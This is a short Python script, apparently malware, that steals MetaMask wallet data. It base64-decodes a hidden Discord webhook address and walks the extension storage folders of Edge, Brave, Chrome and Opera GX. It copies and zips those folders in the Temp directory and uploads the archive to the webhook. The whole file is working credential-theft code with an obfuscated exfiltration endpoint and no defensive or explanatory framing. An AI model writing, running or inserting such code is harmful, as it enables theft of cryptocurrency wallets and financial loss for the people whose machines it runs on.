import requests, os, os.path, shutil
user = os.path.expanduser("~")
import base64

hook = base64.b64decode("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA5Mzc3MDMwODgzNTYxNDc5MS9GSHlTMjVrNWU3dllnY05lSExmcmNpVHNNNTFqZHYzMk5GcXRUc2J5eTBQaVhwQTNiaTNudFUxY2JQd1dUQTNjR1k1Uw==").decode()

def make(args, brow, count):
   try:
    if os.path.exists(args):
     shutil.copytree(args, user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
     
     # 
   except:
      # print("erin")
      shutil.make_archive(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}", "zip", user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
      file = {"file": open(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip", 'rb')}
      r = requests.post(hook, files=file)
      # print(r.content)
      # os.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}")
      #ArithmeticErroros.remove(user+f"\\AppData\\Local\\Temp\\Metamask_{brow}.zip")
def yea():
    
 meta_paths = [
   
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",               "Edge"               ],
        [f"{user}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "Edge"               ],
        [f"{user}\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "Brave"               ],
        [f"{user}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",              "Google"               ],
        [f"{user}\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",               "OperaGX"               ]
    ]
 count = 0
 try:
  for i in meta_paths:
   # print(i)
   make(i[0], brow=i[1], count=count)
   count+=1
 except IndexError:
   # print("errr")
   pass
     
# yea()
